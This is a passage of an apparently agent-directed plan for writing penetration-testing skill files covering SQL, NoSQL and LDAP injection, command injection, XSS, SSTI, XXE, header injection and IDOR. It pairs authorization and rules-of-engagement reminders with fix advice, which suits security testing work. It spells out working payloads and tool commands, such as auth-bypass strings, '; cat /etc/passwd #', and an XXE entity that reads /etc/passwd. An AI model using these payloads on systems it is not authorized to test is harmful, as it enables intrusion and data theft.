# Attack-Technique Skills Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Produce thirty `testing-*` SKILL.md files — one per web-app attack class — following the 8-section format locked in by sub-project 1 and the hybrid Shell + MCP tool-commands style from sub-project 3.

**Architecture:** Thirty prose markdown files at `.claude/skills/testing-<attack>/SKILL.md`. Each declares `methodology-*`, `recon-*`, and `mcp-*` prerequisites in `## When to use`, provides hybrid Shell + MCP tool commands, ends with the verbatim standard authorization paragraph, and stays under ~260 lines. Cross-references use skill names only (no paths); no peer testing-* references in this pass; no specific forward references to unwritten `reporting-*` skills.

**Tech Stack:** Markdown + YAML frontmatter. No code, no automated tests. Structural checks at the end of each task and in the final verification task.

**Spec:** `docs/superpowers/specs/2026-04-17-testing-skills-design.md`
**Exemplars:** `.claude/skills/recon-subdomain-enum/SKILL.md`, `.claude/skills/recon-content-discovery/SKILL.md`, `.claude/skills/mcp-browser/SKILL.md`, `.claude/skills/mcp-burp/SKILL.md`
**Conventions:** `docs/skill-conventions.md`

## Shared reference material

**Standard authorization paragraph (verbatim on every testing-* skill, plain paragraph, no blockquote):**

> Only use against systems you are authorized to test. This skill assumes the user has obtained written authorization. If authorization is uncertain, stop and confirm scope before proceeding.

**Fixed conventions (from sub-project 3 lessons — apply to every task):**

1. American English in body. Frontmatter `description` may retain spec wording.
2. Skill-name globs (`methodology-*`, `recon-*`, `testing-*`, `reporting-*`, `mcp-*`) inside backticks, never inside italic delimiters.
3. MCP tool signatures verified against the authoritative `.claude/skills/mcp-*/SKILL.md`. No invented names. `get_file_contents` (not `github_get_file_contents`). `burp_scope_modify` always includes both `add=` and `remove=`.
4. Authorization paragraph appears only in `## Authorization note`, plain paragraph, no blockquote, verbatim three sentences.
5. Every invasive step in `## Test steps` cross-references `methodology-rules-of-engagement` to remind Claude to check RoE before acting.
6. Prerequisite line at the very top of `## When to use` on its own line in the exact shape: `Prerequisite skills: \`<first>\`, \`<second>\`, ..., \`<last>\`.`
7. No specific forward reference to unwritten `reporting-*` skills; only `reporting-*` category references allowed if any.
8. No peer testing-* cross-references in this sub-project.
9. Description ≤ 175 characters for headroom.

**Per-task verification shape (run after writing each SKILL.md):**

```bash
cd /home/kali/Web-MCP
head -4 .claude/skills/<skill-name>/SKILL.md
grep -c '^## ' .claude/skills/<skill-name>/SKILL.md
wc -l .claude/skills/<skill-name>/SKILL.md
d=$(grep -m1 '^description:' .claude/skills/<skill-name>/SKILL.md | sed 's/^description:[[:space:]]*//')
echo "${#d} chars"
grep -q "Only use against systems you are authorized to test" .claude/skills/<skill-name>/SKILL.md && echo "auth OK" || echo "auth MISSING"
```

Expected: frontmatter block present; section count = 8; line count ≤ 260; description ≤ 175; `auth OK`.

## Execution batching

Thirty tasks grouped into three batches (internal groupings — the plan is a single document):

- **Batch 1 — Injection family (Tasks 1-10):** sqli, nosqli, command-injection, xss-reflected, xss-stored, xss-dom, ssti, xxe, header-injection, ldap-injection.
- **Batch 2 — Access Control + Auth (Tasks 11-19):** idor, missing-function-access, privilege-escalation, path-traversal, csrf, auth-bypass, session-management, jwt, password-reset.
- **Batch 3 — Server-side + Protocol + Client + Other (Tasks 20-30):** ssrf, deserialization, file-upload, open-redirect, request-smuggling, cache-poisoning, cors, clickjacking, prototype-pollution, graphql, sensitive-data-exposure.

After each batch the controller pauses and reports commit SHAs before starting the next batch.

---

## Task template (reference — every task follows this shape)

Each task below specifies:
- Files to create.
- Source material list (spec section, mcp-* SKILL files, prior-skill exemplar).
- Step 1: Write the SKILL.md with the 8-section template, per the spec's per-skill bullets.
- Step 2-4: Structural verification (frontmatter, sections, length, description, auth).
- Step 5: Commit.

The per-skill content spec is in `docs/superpowers/specs/2026-04-17-testing-skills-design.md` under "Per-skill content → testing-<attack>". Each task below reproduces the key bullets the implementer needs.

---

### Task 1: `.claude/skills/testing-sqli/SKILL.md`

**Files:**
- Create: `.claude/skills/testing-sqli/SKILL.md`

**Source material:**
- Spec "Per-skill content → testing-sqli" in `docs/superpowers/specs/2026-04-17-testing-skills-design.md`.
- `docs/skill-conventions.md`.
- `.claude/skills/mcp-burp/SKILL.md` — for MCP tool signatures (`burp_repeater_send`, `burp_proxy_history`).
- `.claude/skills/recon-api-enum/SKILL.md` and `.claude/skills/recon-content-discovery/SKILL.md` — prereq targets.

- [ ] **Step 1: Create directory + write SKILL.md**

```bash
mkdir -p /home/kali/Web-MCP/.claude/skills/testing-sqli
```

**Frontmatter:**
```yaml
---
name: testing-sqli
description: Test for OWASP A03 SQL Injection — error-based, blind, UNION, and time-based — via Burp Repeater and sqlmap.
---
```
(description ~108 chars — fine.)

**Body — 8 H2 sections:**

1. `## When to use` — open with `Prerequisite skills: \`methodology-scoping\`, \`methodology-rules-of-engagement\`, \`recon-api-enum\`, \`recon-content-discovery\`, \`mcp-burp\`.` Paragraph: target has a SQL backend and user input reaches a query; error, blind, or time-based oracle available.
2. `## Signal to look for` — bullets: response shape changes with quote/boolean tampering; visible SQL error banners (MySQL / PostgreSQL / MSSQL / Oracle); slow responses correlated with `SLEEP()` or `WAITFOR DELAY`.
3. `## Test steps` — numbered probe → confirm → extract → document. (1) Identify candidate parameter via `burp_proxy_history`. (2) Probe with `'`, `"`, `)`; observe error/response change. (3) Confirm boolean: compare `' OR 1=1--` vs `' OR 1=2--`. (4) Time-based fallback: `' AND SLEEP(5)-- ` and observe 5s delay. (5) Hand off to `sqlmap` for extraction (respect RoE rate limits — see `methodology-rules-of-engagement`). (6) Capture evidence per `methodology-evidence-capture`.
4. `## Tool commands` — hybrid:
   - **Shell:** `sqlmap -u "https://target.example.com/api/users?id=1" --batch --risk=1 --level=2` (`# Success: sqlmap reports injectable parameter and DBMS fingerprint`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 of request with SQL payload>, host="target.example.com", port=443, secure=true, tab_name="sqli-probe")` with expected `{"ok": true, "data": {"tab_id": "..."}}`; `burp_proxy_history(host="target.example.com", contains="SLEEP(")` to review confirmed injection attempts.
5. `## Interpret results` — error-based: DBMS banner confirms; blind-boolean: response-length diff between true/false payloads; time-based: consistent ~N-second delay proportional to SLEEP. False positives: WAF-triggered 403/503, network jitter (median of 5 trials). Severity considerations tied to authentication state.
6. `## Finding writeup` — title `SQL Injection in <endpoint> parameter <name>`. Severity: unauthenticated data extraction = Critical; authenticated = High; blind-only with limited extraction = Medium. Description template: *"The `<parameter>` value is concatenated into a SQL query at `<endpoint>`, allowing an attacker to alter query semantics and extract/manipulate data."* Evidence per `methodology-evidence-capture`: full request/response pair, sqlmap summary, reproducible `burp_repeater_send` call. Suggested fix: parameterised queries / prepared statements; ORM escaping; least-privilege DB user.
7. `## References` — OWASP WSTG INPV-05 (`https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection`), PortSwigger SQLi (`https://portswigger.net/web-security/sql-injection`), CWE-89 (`https://cwe.mitre.org/data/definitions/89.html`), sqlmap wiki (`https://github.com/sqlmapproject/sqlmap/wiki`).
8. `## Authorization note` — verbatim standard paragraph.

**Length target:** ≤ 260 lines.

- [ ] **Step 2: Verify frontmatter + section count + length**

```bash
cd /home/kali/Web-MCP
head -4 .claude/skills/testing-sqli/SKILL.md
grep -c '^## ' .claude/skills/testing-sqli/SKILL.md
wc -l .claude/skills/testing-sqli/SKILL.md
```
Expected: frontmatter; 8 sections; ≤ 260 lines.

- [ ] **Step 3: Verify description length**

```bash
d=$(grep -m1 '^description:' .claude/skills/testing-sqli/SKILL.md | sed 's/^description:[[:space:]]*//')
echo "${#d} chars"
```
Expected: ≤ 175.

- [ ] **Step 4: Verify authorization paragraph verbatim**

```bash
grep -q "Only use against systems you are authorized to test" .claude/skills/testing-sqli/SKILL.md && echo OK || echo MISSING
```
Expected: `OK`.

- [ ] **Step 5: Commit**

```bash
cd /home/kali/Web-MCP
git add .claude/skills/testing-sqli/SKILL.md
git commit -m "feat(skills): testing-sqli (error/blind/UNION/time-based via Burp + sqlmap)"
```

---

### Task 2: `.claude/skills/testing-nosqli/SKILL.md`

**Source material:** Spec "Per-skill content → testing-nosqli"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-nosqli`

**Frontmatter:**
```yaml
---
name: testing-nosqli
description: Test for OWASP A03 NoSQL Injection against MongoDB, CouchDB, and similar stores via operator-syntax and JS-injection payloads.
---
```

**Body:**
1. `## When to use` — prereq line: `Prerequisite skills: \`methodology-scoping\`, \`methodology-rules-of-engagement\`, \`recon-api-enum\`, \`mcp-burp\`.` Paragraph: target has a NoSQL backend (framework fingerprint = MongoDB, CouchDB, Firestore); user input reaches a query.
2. `## Signal to look for` — JSON-bodied endpoints; authentication forms accepting JSON; absence of SQL-specific error patterns combined with tech-fingerprint evidence of NoSQL.
3. `## Test steps` — (1) Identify JSON endpoints via `burp_proxy_history(contains="application/json")`. (2) Operator-syntax probe: replace `{"user":"x","pass":"y"}` with `{"user":{"$ne":null},"pass":{"$ne":null}}` via `burp_repeater_send`. (3) JS-injection probe (where eval'd): `"user": "'; return true; //"`. (4) Confirm auth bypass or data return. (5) Capture evidence per `methodology-evidence-capture`.
4. `## Tool commands`:
   - **Shell:** manual `curl -X POST -H 'Content-Type: application/json' --data '{"user":{"$gt":""},"pass":{"$gt":""}}' https://target.example.com/api/login` (`# Success: 200 with auth token despite unknown credentials`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64>, host="target.example.com", port=443, secure=true, tab_name="nosqli-probe")`; `burp_proxy_history(contains="$ne")` for history correlation.
5. `## Interpret results` — auth bypass = response = a successful login response. False positives: endpoints that reject unknown JSON with 400 Bad Request are not vulnerable; make sure the operator payload reaches the query unsanitized (check server-side JSON parsing).
6. `## Finding writeup` — title `NoSQL Injection in <endpoint>`. Severity: authentication bypass = Critical; authenticated enumeration = Medium-High. Description template: *"The `<parameter>` value is embedded into a NoSQL query without filtering MongoDB-style operator keys (`$ne`, `$gt`, etc.), allowing an attacker to alter query semantics."* Fix: whitelist type-check inputs; reject keys starting with `$`; use query builders that escape operator keys.
7. `## References` — OWASP WSTG INPV-05 NoSQL subsection, PortSwigger NoSQL (`https://portswigger.net/web-security/nosql-injection`), CWE-943 (`https://cwe.mitre.org/data/definitions/943.html`).
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification (same shape as Task 1, substituting path `testing-nosqli`).
- [ ] **Step 5: Commit**

```bash
cd /home/kali/Web-MCP
git add .claude/skills/testing-nosqli/SKILL.md
git commit -m "feat(skills): testing-nosqli (operator-syntax + JS-injection via Burp)"
```

---

### Task 3: `.claude/skills/testing-command-injection/SKILL.md`

**Source material:** Spec "testing-command-injection"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`, `recon-content-discovery/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-command-injection`

**Frontmatter:**
```yaml
---
name: testing-command-injection
description: Test for OWASP A03 OS Command Injection in user-controlled inputs flowing to shell execution — including blind via time delay.
---
```

**Body:**
1. `## When to use` — prereq: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-api-enum`, `recon-content-discovery`, `mcp-burp`. Paragraph: target invokes shell or external process with user input (network tools, file conversion, image manipulation endpoints).
2. `## Signal to look for` — endpoints described as "run", "execute", "convert", "ping"; error messages containing `/bin/sh`, `sh:`, `error:`, `not found`.
3. `## Test steps` — (1) Probe with `;`, `|`, `` ` ``, `$()`, `&&`. (2) Time-based blind confirmation: `; sleep 10 #` and measure response time. (3) OOB confirmation via interactsh / Burp Collaborator (Pro) when direct output is unavailable. (4) Extract via `; cat /etc/passwd #` (respect RoE — see `methodology-rules-of-engagement`).
4. `## Tool commands`:
   - **Shell:** `commix --url="https://target.example.com/api/ping" --data="host=x" --level=2` (`# Success: commix reports injection technique and OS`); manual `curl` with time-delay payload.
   - **MCP:** `burp_repeater_send(raw_base64=<b64 of request with "; sleep 10 #">, host="target.example.com", port=443, secure=true, tab_name="cmdi-probe")`; measure response time from UI or subsequent `burp_proxy_history` entry.
5. `## Interpret results` — reliable time delay correlates with sleep duration; payload in response body for non-blind cases. False positives: application-level sleep; network latency — take median of 5 trials.
6. `## Finding writeup` — title `OS Command Injection in <endpoint>`. Severity: RCE = Critical; blind without extracted data = High. Evidence: request with payload, response showing delay or output, `burp_repeater_send` reproduction. Fix: avoid shell invocation; use language-native libraries; if shell is required, pass args as a list not a string.
7. `## References` — OWASP WSTG INPV-12, PortSwigger OS command injection, CWE-78.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-command-injection (probe + time-based blind + commix)"`.

---

### Task 4: `.claude/skills/testing-xss-reflected/SKILL.md`

**Source material:** Spec "testing-xss-reflected"; `mcp-burp/SKILL.md`, `mcp-browser/SKILL.md`; `recon-content-discovery/SKILL.md`, `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-xss-reflected`

**Frontmatter:**
```yaml
---
name: testing-xss-reflected
description: Test for OWASP A03 Reflected XSS in query-string, URL-path, and form-parameter reflection points.
---
```

**Body:**
1. `## When to use` — prereq: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-content-discovery`, `recon-sitemap-crawl`, `mcp-burp`, `mcp-browser`. Paragraph: user-controlled input appears in an HTML response without HTML-context-aware encoding.
2. `## Signal to look for` — query parameters visibly reflected in response body; search endpoints; error pages echoing input.
3. `## Test steps` — (1) Find reflection via `burp_proxy_history(contains="<unique-marker>")`. (2) Context probe: identify HTML/attribute/JS/CSS/URL context. (3) Context-appropriate payload via `burp_repeater_send` (e.g. `"><svg/onload=alert(1)>` for HTML context). (4) Confirm execution via `browser_navigate` + `browser_eval("!!document.querySelector('svg[onload]')")`. (5) Capture screenshot evidence via `browser_screenshot(full_page=true)`.
4. `## Tool commands`:
   - **Shell:** `dalfox url "https://target.example.com/search?q=FUZZ"` (`# Success: dalfox confirms reflected payload and context`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64>, host=..., port=443, secure=true, tab_name="xss-probe")`; `browser_navigate(url="https://target.example.com/search?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E")`; `browser_eval(expression="!!document.querySelector('svg[onload]')")` with expected `{"ok": true, "data": {"value": true, "type": "boolean", "exception": null}}`.
5. `## Interpret results` — `browser_eval` returning `true` = execution confirmed. False positives: CSP blocks execution (check `Content-Security-Policy` header via `burp_proxy_history`); reflected-but-encoded (HTML-entities) — not exploitable. Include CSP status in the finding.
6. `## Finding writeup` — title `Reflected XSS in <parameter> at <endpoint>`. Severity: authenticated-origin JS execution = High; one-click impact (SSO token steal) = Critical. Evidence: request URL, response excerpt showing reflection, screenshot + `browser_eval` result, CSP assessment. Fix: context-aware output encoding; Content-Security-Policy as defense-in-depth.
7. `## References` — OWASP WSTG CLNT-01, PortSwigger XSS (`https://portswigger.net/web-security/cross-site-scripting`), CWE-79.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-xss-reflected (context probe + browser_eval confirm + dalfox)"`.

---

### Task 5: `.claude/skills/testing-xss-stored/SKILL.md`

**Source material:** Spec "testing-xss-stored"; `mcp-burp/SKILL.md`, `mcp-browser/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-xss-stored`

**Frontmatter:**
```yaml
---
name: testing-xss-stored
description: Test for OWASP A03 Stored XSS in persistent inputs (comments, profile fields, filenames, review fields).
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-burp`, `mcp-browser`. Paragraph: user input is persisted and re-rendered to other users.
2. `## Signal to look for` — comment/review/message fields; profile fields (name, bio, avatar URL); uploaded filename displayed elsewhere.
3. `## Test steps` — (1) Submit canary payload via `burp_repeater_send` (POST). (2) Retrieve via `browser_navigate` to the rendering page. (3) Confirm execution via `browser_eval`. (4) Screenshot + `burp_proxy_request` evidence.
4. `## Tool commands`:
   - **Shell:** `curl -X POST -d 'comment=<svg/onload=alert(1)>' https://target.example.com/comment` (plus session cookie) (`# Success: 200 stored; redirect to comment-list page`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 submit>, host=..., port=443, secure=true, tab_name="xss-stored-submit")`; `browser_navigate(url="https://target.example.com/post/123")`; `browser_eval(expression="!!document.querySelector('svg[onload]')")`.
5. `## Interpret results` — payload rendered and `browser_eval` returns true = confirmed. False positives: backend sanitiser runs on render not submit (your unauth'd test submission may be sanitised differently than what ends up stored); confirm by checking the rendered HTML via `browser_query(selector="<area>")`. Cross-user impact check: ensure different user can see the payload (use second browser session).
6. `## Finding writeup` — title `Stored XSS in <field>`. Severity: persistent cross-user execution = Critical. Evidence: submit request/response, retrieval request/response, screenshot showing payload rendered, `browser_eval` result. Fix: encode on render not on submit; CSP; sanitise with allow-list HTML parser.
7. `## References` — OWASP WSTG CLNT-02, PortSwigger Stored XSS, CWE-79.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-xss-stored (submit + retrieve + cross-user confirm)"`.

---

### Task 6: `.claude/skills/testing-xss-dom/SKILL.md`

**Source material:** Spec "testing-xss-dom"; `mcp-browser/SKILL.md`; `recon-js-analysis/SKILL.md`, `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-xss-dom`

**Frontmatter:**
```yaml
---
name: testing-xss-dom
description: Test for OWASP A03 DOM-based XSS — sinks executing attacker-controlled input without server round-trip.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-js-analysis`, `recon-sitemap-crawl`, `mcp-browser`. Paragraph: SPA with client-side routing; sources like `location.hash`, `location.search`, `postMessage`, `document.referrer` flow to sinks like `innerHTML`, `eval`, `document.write`.
2. `## Signal to look for` — JS bundle analysis flagged `location.hash` → `innerHTML` flow; framework-specific dangerous sinks (`dangerouslySetInnerHTML`, `v-html`).
3. `## Test steps` — (1) Identify source-sink pair from `recon-js-analysis` output. (2) Craft payload in source (e.g. URL hash). (3) Load via `browser_navigate(url="https://target.example.com/#<svg/onload=alert(1)>")`. (4) Confirm via `browser_eval` and `browser_network_log` (should show NO server round-trip for the payload).
4. `## Tool commands`:
   - **Shell:** none — DOM XSS is a client-side concern. Optional: save bundle and grep for sinks (`grep -oE '(innerHTML|document\.write|eval)\(' main.js`).
   - **MCP:** `browser_navigate(url="https://target.example.com/#%3Csvg%2Fonload%3Dalert(1)%3E")`; `browser_eval(expression="!!document.querySelector('svg[onload]')")`; `browser_network_log(since_seq=0)` to confirm no server round-trip.
5. `## Interpret results` — execution + no server round-trip = DOM XSS. False positives: server DOES see the payload (URL param reflected server-side — then it's reflected XSS, not DOM).
6. `## Finding writeup` — title `DOM-based XSS in <source> → <sink>`. Severity: same as reflected. Evidence: URL with payload, `browser_eval` result, `browser_network_log` showing no server interaction, screenshot. Fix: avoid dangerous sinks; use textContent not innerHTML; `DOMPurify` for allow-list sanitisation.
7. `## References` — OWASP WSTG CLNT-03, PortSwigger DOM XSS (`https://portswigger.net/web-security/cross-site-scripting/dom-based`), CWE-79.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-xss-dom (source-sink + browser_eval + no-round-trip confirm)"`.

---

### Task 7: `.claude/skills/testing-ssti/SKILL.md`

**Source material:** Spec "testing-ssti"; `mcp-burp/SKILL.md`; `recon-tech-fingerprinting/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-ssti`

**Frontmatter:**
```yaml
---
name: testing-ssti
description: Test for OWASP A03 Server-Side Template Injection against Jinja2, Twig, Freemarker, Smarty, ERB, and similar engines.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-tech-fingerprinting` (to know the engine), `mcp-burp`.
2. `## Signal to look for` — input reflected in a rendered template; name/email fields that echo back in mail body; error pages rendered from templates with user input.
3. `## Test steps` — (1) Baseline probe `{{7*7}}` or `${7*7}` or `<%= 7*7 %>` depending on fingerprint. (2) If `49` appears in response = engine evaluates. (3) Engine identification by payload-response table (Jinja2: `{{7*'7'}}` = `7777777`; Twig: same; Freemarker: `${7*7}` + `<#assign...>`). (4) RCE probe (respect RoE — see `methodology-rules-of-engagement`): Jinja2 `{{ ''.__class__.__mro__[1].__subclasses__()...}}` — only with explicit sponsor approval.
4. `## Tool commands`:
   - **Shell:** `tplmap -u "https://target.example.com/greet?name=FUZZ"` (`# Success: tplmap reports engine + RCE status`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with {{7*7}}>, host=..., port=443, secure=true, tab_name="ssti-probe")`; inspect response body for `49`.
5. `## Interpret results` — arithmetic evaluation confirms SSTI; specific payload responses identify engine. False positive: client-side template (Angular `{{}}`) — check whether server or browser rendered the result (use `browser_navigate` + `browser_snapshot` — if the `49` appears in the server response, it's server-side).
6. `## Finding writeup` — title `Server-Side Template Injection in <field>`. Severity: RCE = Critical; confirmed evaluation without RCE = High. Evidence: request with `{{7*7}}`, response showing `49`, engine identification payload-response pair. Fix: never render user input as a template; use context-aware interpolation; sandboxed template environments.
7. `## References` — OWASP WSTG INPV-18, PortSwigger SSTI (`https://portswigger.net/web-security/server-side-template-injection`), CWE-94.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-ssti (arithmetic probe + engine ID + tplmap)"`.

---

### Task 8: `.claude/skills/testing-xxe/SKILL.md`

**Source material:** Spec "testing-xxe"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`, `recon-content-discovery/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-xxe`

**Frontmatter:**
```yaml
---
name: testing-xxe
description: Test for OWASP A03 XML External Entity injection — SOAP, XML-uploading endpoints, and XML-serialized APIs.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-api-enum`, `recon-content-discovery`, `mcp-burp`. Paragraph: endpoint accepts XML (`Content-Type: application/xml`, `text/xml`, SOAP, SVG upload).
2. `## Signal to look for` — XML bodies in proxy history; SOAP WSDL endpoints; file-upload endpoints accepting SVG/DOCX/XLSX.
3. `## Test steps` — (1) Identify XML-accepting endpoint. (2) Probe with `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`. (3) Confirm response contains file contents. (4) OOB alternative: `<!ENTITY % xxe SYSTEM "http://<collab>/x">` with Burp Collaborator (Pro) or interactsh.
4. `## Tool commands`:
   - **Shell:** `curl -X POST -H 'Content-Type: application/xml' --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' https://target.example.com/api/import` (`# Success: response body contains /etc/passwd content`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64>, host=..., port=443, secure=true, tab_name="xxe-probe")`; review response via `burp_proxy_request(id=<N>)`.
5. `## Interpret results` — file contents in response = confirmed. OOB DNS/HTTP callback = confirmed blind XXE. False positive: XML parser with DTD disabled (error mentioning "external DTD forbidden") — not vulnerable.
6. `## Finding writeup` — title `XXE Injection in <endpoint>`. Severity: file read = High; OOB exfil = High; RCE via PHP wrapper or Billion Laughs-style DoS = Critical. Evidence: request with payload, response with file contents, `burp_repeater_send` reproduction. Fix: disable DTD processing in the XML parser (varies per library); prefer JSON.
7. `## References` — OWASP WSTG INPV-07, PortSwigger XXE, CWE-611.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-xxe (entity probe + file read + OOB)"`.

---

### Task 9: `.claude/skills/testing-header-injection/SKILL.md`

**Source material:** Spec "testing-header-injection"; `mcp-burp/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-header-injection`

**Frontmatter:**
```yaml
---
name: testing-header-injection
description: Test for HTTP Header Injection — CRLF, host-header injection, cache-key injection — affecting response splitting and routing.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-burp`. Paragraph: user input flows into HTTP response headers, `Location:`-redirects, or `Host:`-based URL construction (password-reset emails).
2. `## Signal to look for` — `Location:` redirect based on user input; `Set-Cookie:` containing user-controlled values; `Host:`-header used to build absolute URLs.
3. `## Test steps` — (1) CRLF probe: inject `%0D%0A` and observe whether the second line appears as a new header. (2) Host-header: send `Host: attacker.com` and observe whether links in the response use `attacker.com`. (3) Cache-key probe: vary a non-keyed header and observe whether downstream cache serves the poisoned response.
4. `## Tool commands`:
   - **Shell:** `curl -sI -H 'Host: attacker.com' https://target.example.com/reset` (`# Success: reset link in response body or subsequent email uses attacker.com`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with CRLF>, host=..., port=443, secure=true, tab_name="crlf-probe")`; `burp_proxy_history(host="target.example.com")` to compare baseline vs injected response headers.
5. `## Interpret results` — response splitting confirmed when injected CRLF produces a new header line. Host-header: confirmed when an out-of-band artifact (email with link) uses the spoofed host. Cache poisoning: confirmed when an unauth'd refetch returns the poisoned version.
6. `## Finding writeup` — title `HTTP Header Injection via <parameter>`. Severity: response splitting enabling XSS = High; cache poisoning = High; reflected host used in password-reset links = Critical. Evidence: request with CRLF/host payload, response headers, screenshot of email or reset link. Fix: reject `\r\n` and non-ASCII in header-bound inputs; validate Host against an allow-list.
7. `## References` — OWASP WSTG INPV-15, PortSwigger HTTP host header attacks, CWE-93, CWE-113.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-header-injection (CRLF + host + cache-key)"`.

---

### Task 10: `.claude/skills/testing-ldap-injection/SKILL.md`

**Source material:** Spec "testing-ldap-injection"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-ldap-injection`

**Frontmatter:**
```yaml
---
name: testing-ldap-injection
description: Test for OWASP A03 LDAP Injection in auth forms and directory-query endpoints.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-api-enum`, `mcp-burp`. Paragraph: target uses LDAP for auth or directory search (enterprise apps, Active Directory integrations).
2. `## Signal to look for` — auth endpoints that accept username + password and bind to LDAP; directory-search endpoints; error messages containing `ldap`, `invalid DN`, or OID patterns.
3. `## Test steps` — (1) Authentication bypass probe: username `*)(uid=*))(|(uid=*` with any password. (2) Blind enumeration via wildcards (`admin*`). (3) Response-differential analysis.
4. `## Tool commands`:
   - **Shell:** manual `curl -X POST --data 'user=*)(uid=*))(|(uid=*&pass=x' https://target.example.com/login` (`# Success: 200 + auth token`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64>, host=..., port=443, secure=true, tab_name="ldap-probe")`; compare response to baseline failure.
5. `## Interpret results` — successful login on wildcard payload = confirmed bypass. False positive: server strips `()` from username — check raw body in `burp_proxy_request`.
6. `## Finding writeup` — title `LDAP Injection in <parameter>`. Severity: auth bypass = Critical; blind enumeration = Medium. Evidence: payload, response, `burp_repeater_send` reproduction. Fix: escape LDAP special characters; parameterised LDAP queries; use a library that enforces DN grammar.
7. `## References` — OWASP WSTG INPV-06, PortSwigger LDAP injection (limited coverage), CWE-90 (`https://cwe.mitre.org/data/definitions/90.html`).
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-ldap-injection (wildcard auth bypass)"`.

---

### Task 11: `.claude/skills/testing-idor/SKILL.md`

**Source material:** Spec "testing-idor"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`, `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-idor`

**Frontmatter:**
```yaml
---
name: testing-idor
description: Test for OWASP A01 IDOR / BOLA — direct object references accessible without authorization check.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-api-enum`, `recon-sitemap-crawl`, `mcp-burp`. Paragraph: endpoints take an object identifier (`/users/123`, `?id=abc`, `/orders/UUID`) and return resource data.
2. `## Signal to look for` — numeric IDs (incrementable); UUIDs (swappable between accounts); ID in URL or body parameter; absence of a secondary authorization check between session user and object owner.
3. `## Test steps` — (1) Capture a resource request while logged in as User A. (2) Use `burp_match_replace_set` to swap User A's session cookie for User B's when replaying. (3) Re-issue via `burp_repeater_send`; observe whether User B's resource returns or is forbidden. (4) ID-enumeration: increment/decrement numeric IDs; observe other users' data. (5) Writable IDOR: test PUT/POST with swapped IDs.
4. `## Tool commands`:
   - **Shell:** `curl -H "Cookie: session=<USER_B_SESSION>" https://target.example.com/api/users/<USER_A_ID>` (`# Success: User A's data returned with User B's session`).
